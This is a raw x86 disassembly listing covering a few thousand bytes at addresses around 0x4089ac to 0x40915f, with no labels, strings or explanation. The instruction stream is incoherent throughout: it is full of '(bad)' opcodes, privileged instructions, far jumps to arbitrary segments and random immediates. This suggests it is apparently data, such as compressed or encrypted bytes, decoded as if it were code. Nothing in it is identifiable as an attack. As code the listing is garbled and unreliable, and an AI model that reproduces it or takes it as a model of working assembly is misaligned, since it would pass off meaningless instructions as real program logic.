  4089ac:	ins    BYTE PTR es:[edi],dx
  4089ad:	push   ds
  4089ae:	mov    BYTE PTR [ebp-0x7b],0x5a
  4089b2:	and    ch,BYTE PTR [edx+ebp*2]
  4089b5:	les    di,DWORD PTR [edx+0x6a]
  4089b9:	push   es
  4089ba:	fs pop eax
  4089bc:	cmp    si,bp
  4089bf:	mov    BYTE PTR [edx-0x53],cl
  4089c2:	pusha  
  4089c3:	imul   BYTE PTR [ebp-0x6f02d76e]
  4089c9:	das    
  4089ca:	(bad)  
  4089cb:	imul   esi,DWORD PTR [edx+0x9ca43e0],0xffffffc2
  4089d2:	cmp    ebx,edi
  4089d4:	sbb    BYTE PTR [edi],cl
  4089d6:	out    0x4a,eax
  4089d8:	cmp    BYTE PTR [eax-0x4],al
  4089db:	in     al,dx
  4089dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089dd:	adc    BYTE PTR [edi+0x60],al
  4089e0:	adc    eax,DWORD PTR [edi]
  4089e2:	mov    DWORD PTR [ecx-0x2117e4aa],edx
  4089e8:	dec    esp
  4089e9:	aas    
  4089ea:	cmp    DWORD PTR [ebx],edx
  4089ec:	test   bh,dl
  4089ee:	repz jae 0x408a3d
  4089f1:	mov    bh,bl
  4089f3:	cmp    BYTE PTR [ebx+0x5b],0x99
  4089f7:	pop    ss
  4089f8:	mov    ?,WORD PTR [eax+0x25]
  4089fb:	mov    ecx,0x1ccf0d4f
  408a00:	jge    0x408a4e
  408a02:	xchg   BYTE PTR [edx+edx*4+0x20],bh
  408a06:	sub    al,0x5a
  408a08:	add    eax,0xbd29f33c
  408a0d:	mov    esi,DWORD PTR [ecx]
  408a0f:	addr16 dec ebp
  408a11:	pop    ebx
  408a12:	push   ebp
  408a13:	imul   edx,ebp,0x70
  408a16:	icebp  
  408a17:	cmp    dl,BYTE PTR [eax+0x79f2dd62]
  408a1d:	jae    0x4089f0
  408a1f:	fcmovbe st,st(3)
  408a21:	repnz push cs
  408a23:	lea    eax,[ecx+eiz*2-0x6dae5b51]
  408a2a:	in     eax,0xea
  408a2c:	cwde   
  408a2d:	sub    DWORD PTR [edx],eax
  408a2f:	sahf   
  408a30:	stc    
  408a31:	iret   
  408a32:	xlat   BYTE PTR ds:[ebx]
  408a33:	add    BYTE PTR ds:0x630a839b,dh
  408a39:	test   ebp,esp
  408a3b:	retf   0x86ed
  408a3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a3f:	sar    BYTE PTR ds:0x14f53be,0x2b
  408a46:	leave  
  408a47:	ret    
  408a48:	mov    cl,0x98
  408a4a:	pop    edi
  408a4b:	jmp    0x81762406
  408a50:	sub    eax,0xf09b0213
  408a55:	xor    al,0xd5
  408a57:	popa   
  408a58:	dec    ebx
  408a59:	lds    ebp,FWORD PTR [ebx]
  408a5b:	in     eax,0x2f
  408a5d:	std    
  408a5e:	mov    esi,0xdcce15f
  408a63:	xchg   ebp,eax
  408a64:	loopne 0x408ada
  408a66:	pop    ds
  408a67:	ficom  WORD PTR [eax]
  408a69:	cmp    BYTE PTR [ecx],bh
  408a6b:	or     BYTE PTR [ebx-0x7c],al
  408a6e:	(bad)  
  408a6f:	mov    ?,WORD PTR [ebx+ebp*8]
  408a72:	(bad)  
  408a73:	mov    edx,0xc0ba738f
  408a78:	add    dl,BYTE PTR [eax+0x34]
  408a7b:	add    esp,edi
  408a7d:	jae    0x408ad2
  408a7f:	lea    edi,[edx-0x3ce4d80b]
  408a85:	push   edx
  408a86:	mov    esi,0x280649c
  408a8b:	cmp    edx,ebp
  408a8d:	mov    al,ds:0x3daaf3e
  408a92:	cmp    eax,0x35ec8c71
  408a97:	mov    ebp,0x79e6c6ee
  408a9c:	(bad)  
  408a9d:	fidiv  WORD PTR [edi]
  408a9f:	mov    BYTE PTR [ebx],ah
  408aa1:	retf   
  408aa2:	pop    esi
  408aa3:	test   DWORD PTR [edi+0x7d8be7ba],ebx
  408aa9:	ret    
  408aaa:	aad    0x6e
  408aac:	mov    edi,edi
  408aae:	mov    ah,cl
  408ab0:	mov    edi,0x7ee57436
  408ab5:	jl     0x408a9c
  408ab7:	sbb    bh,cl
  408ab9:	fs call 0xae8:0x62c332f2
  408ac1:	jecxz  0x408a56
  408ac3:	push   ds
  408ac4:	mov    esi,DWORD PTR [edi+0xc48fb76]
  408aca:	lods   eax,DWORD PTR ds:[esi]
  408acb:	sbb    eax,0xab8a1cde
  408ad0:	sub    bl,BYTE PTR ds:0x614ffe5d
  408ad6:	push   ecx
  408ad7:	cmp    BYTE PTR [eax-0x9747fb6],bh
  408add:	or     DWORD PTR [edx+0x168d724a],esi
  408ae3:	mov    al,ds:0x6fb6e450
  408ae8:	rol    edx,cl
  408aea:	push   esi
  408aeb:	shl    DWORD PTR [esp+ebx*1+0x4a],cl
  408aef:	and    eax,0x34c29f65
  408af4:	xchg   edi,eax
  408af5:	dec    ebp
  408af6:	push   ebx
  408af7:	fs aas 
  408af9:	enter  0x4c0b,0xd7
  408afd:	rol    BYTE PTR [eax-0x4],cl
  408b00:	add    dh,BYTE PTR [eax-0x13]
  408b03:	nop
  408b04:	xor    edx,DWORD PTR [edi]
  408b06:	fimul  DWORD PTR [edx+0x3d53b948]
  408b0c:	pop    ecx
  408b0d:	jl     0x408b3a
  408b0f:	sbb    dh,BYTE PTR [edi]
  408b11:	cmp    edi,DWORD PTR [ebp+0x7cbc0100]
  408b17:	pop    esp
  408b18:	add    al,0x8d
  408b1a:	mov    cl,0x51
  408b1c:	fst    QWORD PTR [edi-0x54]
  408b1f:	sbb    BYTE PTR [edi],dh
  408b21:	mov    dh,0xb0
  408b23:	mov    bh,BYTE PTR [edi+0x6deaff93]
  408b29:	out    dx,al
  408b2a:	inc    ecx
  408b2b:	aaa    
  408b2c:	jge    0x408b68
  408b2e:	les    ebx,FWORD PTR [ebp+eax*2-0x33]
  408b32:	das    
  408b33:	jae    0x408b9e
  408b35:	fisub  DWORD PTR [esi+0x182ac17b]
  408b3b:	mov    fs,WORD PTR [edi+ebx*1+0x7]
  408b3f:	jl     0x408b09
  408b41:	mov    ds:0x59ad1f4d,al
  408b46:	lock add eax,0xedaa11ee
  408b4c:	sar    DWORD PTR [ebx+0x709f0d00],0xdc
  408b53:	(bad)  
  408b55:	inc    esp
  408b56:	jno    0x408aeb
  408b58:	add    eax,0xbd7c38a2
  408b5d:	pop    ebx
  408b5e:	and    ah,BYTE PTR [edx-0x3e]
  408b61:	fwait
  408b62:	ja     0x408b48
  408b64:	fst    QWORD PTR [eax+ebp*2+0x3334a9d7]
  408b6b:	push   ecx
  408b6c:	ror    al,cl
  408b6e:	out    dx,al
  408b6f:	jno    0x408b33
  408b71:	adc    edx,DWORD PTR [esp+ebp*1-0x288861cb]
  408b78:	sub    BYTE PTR [edi+0x14127a43],ch
  408b7e:	dec    ebx
  408b7f:	(bad)  
  408b80:	pop    ebp
  408b81:	mov    al,0x44
  408b83:	jmp    0x53bd:0x13e61da1
  408b8a:	jbe    0x408b2e
  408b8c:	sahf   
  408b8d:	rcr    esi,1
  408b8f:	(bad)  [edi-0x43cb73e1]
  408b95:	push   es
  408b96:	lock pop ss
  408b98:	clc    
  408b99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b9a:	or     ch,BYTE PTR [ecx+0x39]
  408b9d:	mov    DWORD PTR [edi],ecx
  408b9f:	outs   dx,BYTE PTR ds:[esi]
  408ba0:	loope  0x408bd4
  408ba2:	add    BYTE PTR [esi],cl
  408ba4:	jnp    0x408be6
  408ba6:	call   0x917e:0xbba9c283
  408bad:	pop    edx
  408bae:	pusha  
  408baf:	xchg   BYTE PTR [esi],ah
  408bb1:	bound  ebx,QWORD PTR [ebx-0x7f]
  408bb4:	in     eax,0xf0
  408bb6:	and    al,dl
  408bb8:	sbb    BYTE PTR [edi+0x7942a4c5],bh
  408bbe:	jnp    0x408ba8
  408bc0:	sbb    DWORD PTR [ebx+0x64aa2c22],0xffffff80
  408bc7:	sbb    ch,BYTE PTR [edi+0x5a]
  408bca:	mov    edi,0x763ef6e0
  408bcf:	xchg   esi,eax
  408bd0:	lahf   
  408bd1:	jle    0x408bf2
  408bd3:	and    bh,BYTE PTR [ebp+0x14b06d9c]
  408bd9:	mov    bh,0xff
  408bdb:	jns    0x408bae
  408bdd:	cmp    eax,0xfd58ecc8
  408be2:	ins    DWORD PTR es:[edi],dx
  408be3:	frstor [edx]
  408be5:	xor    ah,ch
  408be7:	in     eax,dx
  408be8:	scas   eax,DWORD PTR es:[edi]
  408be9:	pop    esi
  408bea:	sahf   
  408beb:	inc    ecx
  408bec:	cmp    al,0xed
  408bee:	nop
  408bef:	sbb    dl,BYTE PTR [edi]
  408bf1:	mov    ebx,ds
  408bf3:	pop    ebx
  408bf4:	inc    esp
  408bf5:	cmp    bl,ah
  408bf7:	cmc    
  408bf8:	(bad)  
  408bf9:	sub    DWORD PTR [eax+edi*8+0x1],eax
  408bfd:	xchg   ecx,eax
  408bfe:	push   esi
  408bff:	add    eax,0x7285b0c2
  408c04:	mov    esp,0xc6f1b12d
  408c09:	aam    0xf3
  408c0b:	js     0x408c3a
  408c0d:	sub    BYTE PTR [ecx-0x70],al
  408c10:	pop    ebx
  408c11:	inc    eax
  408c12:	sti    
  408c13:	cmp    ecx,0xa7d1eaf5
  408c19:	cld    
  408c1a:	out    dx,eax
  408c1b:	out    dx,eax
  408c1c:	dec    edx
  408c1d:	out    dx,al
  408c1e:	adc    BYTE PTR [esi],al
  408c20:	or     bl,dl
  408c22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c23:	popa   
  408c24:	pop    es
  408c25:	xchg   sp,ax
  408c27:	dec    esi
  408c28:	mov    BYTE PTR [eax-0x7861aca7],dh
  408c2e:	ret    
  408c2f:	(bad)  
  408c30:	mov    dh,0x68
  408c32:	inc    ebx
  408c33:	xchg   BYTE PTR ds:0x205e4169,bh
  408c39:	mov    dl,al
  408c3b:	(bad)  
  408c3c:	adc    dl,bh
  408c3e:	fndisi(8087 only) 
  408c40:	xchg   DWORD PTR [edi-0x29],ebp
  408c43:	mov    eax,0x11ac348f
  408c48:	mov    edx,0xcf8bc222
  408c4d:	pop    ss
  408c4e:	in     al,dx
  408c4f:	lods   al,BYTE PTR ds:[esi]
  408c50:	xchg   edi,eax
  408c51:	test   BYTE PTR [ecx-0x658c979a],ah
  408c57:	fcmovbe st,st(4)
  408c59:	call   DWORD PTR [ecx+0x28]
  408c5c:	mov    dl,0x5e
  408c5e:	and    DWORD PTR [ebp+0x38],0xffffffa2
  408c62:	ret    
  408c63:	mov    dh,0x55
  408c65:	mov    bh,0xb3
  408c67:	pop    es
  408c68:	pusha  
  408c69:	leave  
  408c6a:	scas   eax,DWORD PTR es:[edi]
  408c6b:	push   edi
  408c6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c6d:	dec    esi
  408c6e:	mov    eax,ds:0x6d3b96a1
  408c73:	aaa    
  408c74:	xor    al,0xc3
  408c76:	frstor [ebp-0x1730ef2f]
  408c7c:	pop    edx
  408c7d:	pop    esp
  408c7e:	arpl   WORD PTR [ebx+edi*1+0x2d85c46f],bx
  408c85:	cmp    eax,0x7c65737e
  408c8a:	and    eax,0xa4f5d907
  408c8f:	das    
  408c90:	fdivr  DWORD PTR [ecx]
  408c92:	mov    ebp,0xc145de95
  408c97:	pusha  
  408c98:	fisubr WORD PTR [esi]
  408c9a:	or     edx,DWORD PTR [eax-0xc]
  408c9d:	leave  
  408c9e:	mov    DWORD PTR [eax+0x173c015c],ebp
  408ca4:	or     eax,0x99118bbc
  408ca9:	jmp    0x408cdd
  408cab:	and    BYTE PTR [esi+0x58e509e4],bh
  408cb1:	or     al,0x1a
  408cb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cb4:	cmp    BYTE PTR [edx+0x30],0x81
  408cb8:	inc    ecx
  408cb9:	imul   ebp,DWORD PTR [edi+0x20],0xecda82e8
  408cc0:	(bad)  
  408cc1:	mov    ds:0x9b8bf3ed,eax
  408cc6:	cmp    ebx,DWORD PTR [edi]
  408cc8:	add    edi,ebp
  408cca:	xor    al,0xfb
  408ccc:	pushf  
  408ccd:	mov    esi,DWORD PTR [eax+0x14]
  408cd0:	jbe    0x408c91
  408cd2:	mov    edx,0x57a0fc38
  408cd7:	mov    al,al
  408cd9:	in     eax,dx
  408cda:	cmp    cl,BYTE PTR [eax+0x2821f54c]
  408ce0:	pop    es
  408ce1:	mov    ch,0xed
  408ce3:	or     al,0xdc
  408ce5:	mov    ebx,0x662e94d8
  408cea:	add    al,0x5
  408cec:	mov    esi,0x7a068dd3
  408cf1:	rcr    ah,0x41
  408cf4:	cmp    DWORD PTR [ecx],esp
  408cf6:	xchg   edi,eax
  408cf7:	dec    edx
  408cf8:	pop    edx
  408cfa:	mov    eax,0x9d2c29e
  408cff:	je     0x408ccb
  408d01:	sub    eax,0xa9333ffb
  408d06:	aaa    
  408d07:	aam    0xa8
  408d09:	mov    ebp,0x68c87662
  408d0e:	inc    eax
  408d0f:	lds    esp,FWORD PTR [esi+0x7]
  408d12:	lds    ebx,FWORD PTR [eax-0x6f]
  408d15:	mov    esp,esi
  408d17:	rcl    bl,cl
  408d19:	call   0xd9d4:0x3f5a3166
  408d20:	cmc    
  408d21:	(bad)  
  408d22:	or     ecx,DWORD PTR [ebp+0x59]
  408d25:	add    DWORD PTR [esi],ecx
  408d27:	xchg   ebx,eax
  408d28:	dec    ebx
  408d29:	or     eax,DWORD PTR [esi]
  408d2b:	and    ebx,0x39b5fab3
  408d31:	cmp    BYTE PTR [esi],dl
  408d33:	(bad)  
  408d34:	stos   BYTE PTR es:[edi],al
  408d35:	and    eax,0xb4dadd49
  408d3a:	push   0x38c375a5
  408d3f:	pop    ds
  408d40:	mov    eax,0x65a666d8
  408d45:	aas    
  408d46:	or     ecx,DWORD PTR [eax+0x3061e667]
  408d4c:	test   eax,0x43168c29
  408d51:	int    0xb
  408d53:	pop    esp
  408d54:	add    DWORD PTR [ebp+0x35],0xffffff98
  408d58:	mov    esp,0x92c08d8b
  408d5d:	sub    al,0x72
  408d5f:	sbb    BYTE PTR [esi+0x5a7c60c7],al
  408d65:	xchg   DWORD PTR [eax+0x39],ebx
  408d68:	mov    edi,0x260e9dba
  408d6d:	data16 int3 
  408d6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d70:	test   BYTE PTR [edi-0x34],dh
  408d73:	mov    al,al
  408d75:	sub    eax,0x95c5c62c
  408d7a:	jp     0x408d12
  408d7c:	jle    0x408d20
  408d7e:	enter  0x7476,0x42
  408d82:	out    dx,al
  408d83:	xchg   edi,eax
  408d84:	or     DWORD PTR [ebx+0x47d3fcde],eax
  408d8a:	mov    ds:0xbff81407,eax
  408d8f:	pop    esi
  408d90:	ins    BYTE PTR es:[edi],dx
  408d91:	pop    ebx
  408d92:	mov    edi,0x6df9b8da
  408d97:	xchg   DWORD PTR [ebp-0x4a6baaf6],esp
  408d9d:	sub    BYTE PTR [ebp+0x33],bh
  408da0:	shl    BYTE PTR [edx-0x50dbc21e],1
  408da6:	mov    dh,0xde
  408da8:	and    DWORD PTR [ebp-0x5e3e5406],0xa0e9c1e9
  408db2:	popf   
  408db3:	sar    DWORD PTR [ebx+0x3df7f7d9],cl
  408db9:	outs   dx,DWORD PTR ds:[esi]
  408dba:	mov    ebx,DWORD PTR [ebx+0x53]
  408dbd:	mov    ebp,0x31422d3a
  408dc2:	push   ecx
  408dc3:	pop    ebx
  408dc4:	mov    edi,0x80097260
  408dc9:	xor    BYTE PTR [ebp+0x16],ah
  408dcc:	mov    edi,0xe0fe586f
  408dd1:	mov    bl,0x97
  408dd3:	loop   0x408db1
  408dd5:	in     eax,dx
  408dd6:	jmp    0x408e01
  408dd8:	cmp    BYTE PTR [ecx+0x75],bl
  408ddb:	iret   
  408ddc:	adc    esp,DWORD PTR [esi-0x57]
  408ddf:	adc    al,0x45
  408de1:	int3   
  408de2:	fwait
  408de3:	sbb    eax,0x1cd60193
  408de8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408de9:	ret    
  408dea:	hlt    
  408deb:	adc    bl,BYTE PTR [esi+0x66c814ea]
  408df1:	int    0x1
  408df3:	mov    esi,0x924a65a
  408df8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408df9:	rcl    BYTE PTR [ebp+0xfa5c9aa],1
  408dff:	push   0x6e89387b
  408e04:	scas   eax,DWORD PTR es:[edi]
  408e05:	xor    bl,BYTE PTR [esi+ebp*8]
  408e08:	sbb    DWORD PTR [ecx+ebp*8],esp
  408e0b:	sbb    eax,0xa6b93d1e
  408e10:	imul   esi,DWORD PTR [edi],0xffffffe2
  408e13:	mov    WORD PTR [edi],cs
  408e15:	adc    al,0xa
  408e17:	add    al,0x18
  408e19:	clc    
  408e1a:	push   es
  408e1b:	xchg   BYTE PTR [eax],bh
  408e1d:	aad    0x91
  408e1f:	add    al,0x10
  408e21:	int3   
  408e22:	retf   
  408e23:	repnz mov ds:0xc6ff1cf7,eax
  408e29:	fucom  st(6)
  408e2b:	ss int 0xdc
  408e2e:	add    dh,ch
  408e30:	pop    ds
  408e31:	les    esp,FWORD PTR [ecx+0x6c3a000c]
  408e37:	jmp    0x408e9d
  408e39:	jmp    DWORD PTR [edi-0xb51d7b]
  408e3f:	mov    edi,0x8494dea5
  408e44:	mov    ecx,0x4b5f3fca
  408e49:	shl    BYTE PTR ds:0xb69adaec,cl
  408e4f:	jno    0x408e57
  408e51:	xor    al,0x31
  408e53:	jno    0x408e5c
  408e55:	adc    bl,BYTE PTR ds:0x89c72b31
  408e5b:	setns  ah
  408e5e:	aaa    
  408e5f:	sub    al,0x95
  408e61:	retf   
  408e62:	(bad)  
  408e63:	sub    cl,cl
  408e65:	inc    edi
  408e66:	daa    
  408e67:	xor    ebp,esi
  408e69:	in     eax,dx
  408e6a:	jge    0x408e4e
  408e6c:	pmulhuw mm6,QWORD PTR [edx]
  408e6f:	pop    edx
  408e70:	inc    eax
  408e71:	xor    ebp,DWORD PTR [ebx-0x18]
  408e74:	pop    ebp
  408e75:	in     eax,dx
  408e76:	sbb    ah,BYTE PTR ds:0xf7c2d178
  408e7c:	not    DWORD PTR [ecx-0x6e48b10c]
  408e82:	pop    esp
  408e83:	jp     0x408eae
  408e85:	rcr    DWORD PTR [ecx-0x1b7eb673],1
  408e8b:	xchg   ecx,eax
  408e8c:	xchg   esi,eax
  408e8d:	adc    ah,BYTE PTR [edi+0x6b]
  408e90:	mov    dh,0x7e
  408e92:	std    
  408e93:	xchg   edx,eax
  408e94:	(bad)  
  408e95:	fisubr WORD PTR [edx]
  408e97:	inc    eax
  408e98:	adc    esp,ecx
  408e9a:	cwde   
  408e9b:	push   ds
  408e9c:	jmp    0x5f7ba675
  408ea1:	sub    ebx,DWORD PTR [esi]
  408ea3:	(bad)  
  408ea4:	jmp    0x717f:0x4b20b486
  408eab:	sub    bh,BYTE PTR [esi]
  408ead:	pop    ss
  408eae:	arpl   WORD PTR [edi-0x10847f9f],di
  408eb4:	inc    esi
  408eb5:	lods   eax,DWORD PTR ds:[esi]
  408eb6:	shl    DWORD PTR ds:0xea85f031,0x6b
  408ebd:	and    ebp,DWORD PTR [eax+0xc]
  408ec0:	and    al,0xd8
  408ec2:	inc    ebx
  408ec3:	loop   0x408e72
  408ec5:	ss jmp 0x408e97
  408ec8:	lds    esp,FWORD PTR [edi-0x10da673b]
  408ece:	adc    dh,BYTE PTR [ecx+0x11374fd3]
  408ed4:	aaa    
  408ed5:	int3   
  408ed6:	push   ss
  408ed7:	dec    ecx
  408ed8:	imul   ch
  408eda:	mov    dh,BYTE PTR [edi+0x776e3df6]
  408ee0:	nop
  408ee1:	xchg   DWORD PTR [ebp-0x45],edi
  408ee4:	inc    esp
  408ee5:	jl     0x408f33
  408ee7:	ins    DWORD PTR es:[edi],dx
  408ee8:	jl     0x408f4e
  408eea:	loop   0x408e9e
  408eec:	clc    
  408eed:	xchg   esi,eax
  408eee:	pop    esp
  408eef:	dec    edi
  408ef0:	mov    esp,0x4e638d7d
  408ef5:	mov    edx,0xf6529d44
  408efa:	add    al,0x2b
  408efc:	popa   
  408efd:	ret    0x36d2
  408f00:	mov    bl,0xa8
  408f02:	xchg   ebp,eax
  408f03:	push   es
  408f04:	mov    esp,0x556d1cf0
  408f09:	jge    0x408f6a
  408f0b:	add    eax,0x2e7cc882
  408f10:	push   ebx
  408f11:	fwait
  408f12:	lods   al,BYTE PTR ds:[esi]
  408f13:	push   edi
  408f14:	push   esi
  408f15:	xchg   BYTE PTR [esi+0xd],ah
  408f18:	and    DWORD PTR [edx],esp
  408f1a:	mov    al,ds:0xfa21d4d4
  408f1f:	test   eax,0x9a76a135
  408f24:	sahf   
  408f25:	aad    0xda
  408f27:	sbb    eax,0x97ef1c6
  408f2c:	push   edx
  408f2d:	ds inc ebp
  408f2f:	push   ecx
  408f30:	xor    esi,DWORD PTR [edi-0x31890a35]
  408f36:	jmp    0x288c:0xdddf3896
  408f3d:	jae    0x408f38
  408f3f:	sar    ecx,1
  408f41:	imul   esi,DWORD PTR [edi],0x2f06bf25
  408f47:	in     eax,0x8b
  408f49:	fs ud1 eax,eax
  408f4d:	jge    0x408fa8
  408f4f:	repz and BYTE PTR [eax-0x5dba12a1],bh
  408f56:	mov    esp,0xa6b784ec
  408f5b:	mov    dl,0xa4
  408f5d:	cmp    DWORD PTR [ecx-0x10],0xfffffff4
  408f61:	sti    
  408f62:	dec    eax
  408f63:	pop    ss
  408f64:	jecxz  0x408f07
  408f66:	xor    DWORD PTR [edi-0x1a2a8d11],esi
  408f6c:	int    0xc8
  408f6e:	xlat   BYTE PTR ds:[ebx]
  408f6f:	cli    
  408f70:	fidiv  WORD PTR [eax]
  408f72:	out    dx,al
  408f73:	pop    es
  408f74:	cmp    eax,DWORD PTR [ecx-0x26151599]
  408f7a:	ror    DWORD PTR [ecx-0x6ae89060],0x5f
  408f81:	je     0x408f3d
  408f83:	mov    al,0x5a
  408f85:	scas   al,BYTE PTR es:[edi]
  408f86:	mov    bl,0x4e
  408f88:	test   bh,bh
  408f8a:	scas   al,BYTE PTR es:[edi]
  408f8b:	adc    DWORD PTR [ebp+0x72b03032],esi
  408f91:	frstor [ebx+0x28]
  408f94:	mov    al,ds:0xf1dfbdb2
  408f99:	std    
  408f9a:	sbb    DWORD PTR [edi-0x20],0x5af74f81
  408fa1:	aam    0x45
  408fa3:	mov    dl,0x3f
  408fa5:	mov    eax,ds:0xbb4b2d
  408faa:	aas    
  408fab:	xor    ah,BYTE PTR [ecx-0x45]
  408fae:	imul   ebx,DWORD PTR [edx-0x64],0x231ade02
  408fb5:	repz mov ds:0xb0afc3c6,al
  408fbb:	or     bh,BYTE PTR [edi+0x1f]
  408fbe:	int3   
  408fbf:	mov    cl,0x79
  408fc1:	pusha  
  408fc2:	xchg   ecx,eax
  408fc3:	mov    ds:0xe3bf57ba,al
  408fc8:	inc    ebx
  408fc9:	in     eax,0x16
  408fcb:	mov    WORD PTR [ecx-0x25],ss
  408fce:	outs   dx,DWORD PTR ds:[esi]
  408fcf:	push   esi
  408fd0:	test   eax,0x24504013
  408fd5:	mov    ah,0xa3
  408fd7:	call   0x2842163a
  408fdc:	xor    al,0x22
  408fde:	xchg   ebp,eax
  408fdf:	add    DWORD PTR [eax-0x3a],ebp
  408fe2:	pop    esp
  408fe3:	int3   
  408fe4:	push   eax
  408fe5:	(bad)  
  408fe6:	mov    ebx,0x35090a57
  408feb:	pop    ss
  408fec:	cdq    
  408fed:	sysret 
  408fef:	fdivr  DWORD PTR [esi+0x767063e6]
  408ff5:	sub    esp,ecx
  408ff7:	shl    DWORD PTR ds:0xd3cd4372,cl
  408ffd:	sub    al,0xf6
  408fff:	sbb    DWORD PTR [edi-0x2c],eax
  409002:	(bad)  
  409003:	fstp   DWORD PTR [ebp-0x71]
  409006:	pop    esp
  409007:	and    ebp,eax
  409009:	inc    eax
  40900a:	icebp  
  40900b:	and    al,0xcc
  40900d:	mov    dl,0xe7
  40900f:	loopne 0x408fc9
  409011:	neg    BYTE PTR [eax-0x37ce1591]
  409017:	stos   DWORD PTR es:[edi],eax
  409018:	out    dx,al
  409019:	sbb    cl,BYTE PTR [eax+0x6f]
  40901c:	out    dx,al
  40901d:	push   eax
  40901e:	lods   al,BYTE PTR ds:[esi]
  40901f:	xor    ch,ch
  409021:	jl     0x408fed
  409023:	xchg   esp,eax
  409024:	mov    ah,0x3b
  409026:	icebp  
  409027:	add    dh,BYTE PTR [ecx]
  409029:	out    dx,eax
  40902a:	pop    edx
  40902b:	xor    esi,DWORD PTR [edx]
  40902d:	(bad)  
  40902e:	scas   al,BYTE PTR es:[edi]
  40902f:	ins    DWORD PTR es:[edi],dx
  409030:	sbb    dh,dh
  409032:	out    dx,eax
  409033:	outs   dx,DWORD PTR ds:[esi]
  409034:	adc    ebp,DWORD PTR [esi-0x1e]
  409037:	lahf   
  409038:	dec    esp
  409039:	call   0xa055:0x30aa5efa
  409040:	push   cs
  409041:	jns    0x409062
  409043:	inc    edi
  409044:	lahf   
  409045:	and    BYTE PTR [eax+0x75],0xbe
  409049:	pop    eax
  40904a:	je     0x409058
  40904c:	pop    ebp
  40904d:	clc    
  40904e:	mov    dh,0xcd
  409050:	and    eax,0x1dff339c
  409055:	fldcw  WORD PTR [esi]
  409057:	cmp    edi,DWORD PTR [ecx+0x41]
  40905a:	sub    al,bl
  40905c:	xchg   esp,eax
  40905d:	cs in  eax,dx
  40905f:	rcl    BYTE PTR [esp+ecx*4+0x72],1
  409063:	xlat   BYTE PTR ds:[ebx]
  409064:	loope  0x409064
  409066:	lods   al,BYTE PTR ds:[esi]
  409067:	sar    BYTE PTR [edx+0x71],1
  40906a:	ds inc esi
  40906c:	cmp    BYTE PTR [esi-0x7f],cl
  40906f:	xchg   ebx,eax
  409070:	out    dx,eax
  409071:	cmp    DWORD PTR [ebp+0x253ceff3],esi
  409077:	movlps QWORD PTR [edx+0x3b208936],xmm1
  40907e:	retf   0xacc0
  409081:	aam    0x44
  409083:	and    eax,0x5e72ac42
  409088:	call   0xf77f0e0e
  40908d:	stos   DWORD PTR es:[edi],eax
  40908e:	cwde   
  40908f:	mov    bh,0xab
  409091:	lahf   
  409092:	dec    ecx
  409093:	loopne 0x40906f
  409095:	inc    esi
  409096:	jnp    0x4090f6
  409098:	loop   0x409033
  40909a:	into   
  40909b:	pop    esi
  40909c:	inc    edx
  40909d:	aaa    
  40909e:	test   al,0xff
  4090a0:	pushf  
  4090a1:	adc    cl,BYTE PTR [esi-0x71]
  4090a4:	jne    0x4090fc
  4090a6:	jge    0x4090b7
  4090a8:	xchg   ebp,eax
  4090a9:	shl    DWORD PTR [edx+0x64],0x37
  4090ad:	add    ch,0xc
  4090b0:	dec    esp
  4090b1:	hlt    
  4090b2:	ja     0x409049
  4090b4:	pop    ecx
  4090b5:	pop    ss
  4090b6:	pcmpeqw mm6,QWORD PTR [eax+0x55]
  4090ba:	shl    DWORD PTR [esi],cl
  4090bc:	jo     0x409105
  4090be:	loop   0x409081
  4090c0:	or     BYTE PTR [esi+0x5b],dl
  4090c3:	sbb    BYTE PTR [esi+0x387155ed],bh
  4090c9:	cmp    ecx,DWORD PTR [ebx-0x55]
  4090cc:	jae    0x4090f7
  4090ce:	or     bh,BYTE PTR [ecx-0x3c]
  4090d1:	dec    edi
  4090d2:	je     0x409063
  4090d4:	mov    ecx,0x4e7a8070
  4090d9:	cmp    DWORD PTR [ebx],edx
  4090db:	cmp    al,0x64
  4090dd:	mov    ch,dl
  4090df:	(bad)  
  4090e0:	pop    edx
  4090e1:	and    dl,BYTE PTR [esi-0x779efcfc]
  4090e7:	aad    0x9
  4090e9:	cmp    BYTE PTR [edi-0x378eb9d7],dl
  4090ef:	jmp    FWORD PTR [ebp+0x5b]
  4090f2:	out    0x56,al
  4090f4:	push   ebx
  4090f5:	int3   
  4090f6:	mov    al,0xfb
  4090f8:	push   ds
  4090f9:	xchg   ebp,eax
  4090fa:	dec    esp
  4090fb:	pusha  
  4090fc:	aam    0x8
  4090fe:	cwde   
  4090ff:	retf   
  409100:	inc    edx
  409101:	jb     0x4090b2
  409103:	push   edi
  409104:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409105:	sub    BYTE PTR [edi-0xb9b88c4],cl
  40910b:	jg     0x4090eb
  40910d:	xor    al,0x40
  40910f:	adc    DWORD PTR [ecx+ebx*8],0x7c
  409113:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409114:	fistp  WORD PTR [eax]
  409116:	gs ss imul ebp,esp,0xfffffff8
  40911b:	(bad)  
  40911d:	sub    esi,DWORD PTR [ebp+ebp*1-0x14]
  409121:	std    
  409122:	dec    ecx
  409123:	adc    ecx,DWORD PTR [ebp+0x3c877f3e]
  409129:	add    bh,BYTE PTR [eax-0xb]
  40912c:	fidivr WORD PTR [ecx+0x6d]
  40912f:	hlt    
  409130:	repz je 0x409139
  409133:	jnp    0x4090e8
  409135:	jb     0x4091ab
  409137:	jg     0x409147
  409139:	lods   al,BYTE PTR ds:[esi]
  40913a:	lahf   
  40913b:	nop
  40913c:	lea    ebx,[ebp+edx*2-0x4e6642e8]
  409143:	idiv   ebx
  409145:	inc    ebp
  409146:	cmp    dh,bh
  409148:	(bad)  
  409149:	xor    DWORD PTR [ebx+0x3e],ebx
  40914c:	dec    ebx
  40914d:	sar    BYTE PTR [esi+eiz*8+0x62],1
  409151:	jmp    0x40912e
  409153:	mov    al,ds:0x42993099
  409158:	and    dl,BYTE PTR [ebx+0x5677d75c]
  40915e:	scas   eax,DWORD PTR es:[edi]
  40915f:	inc    ecx
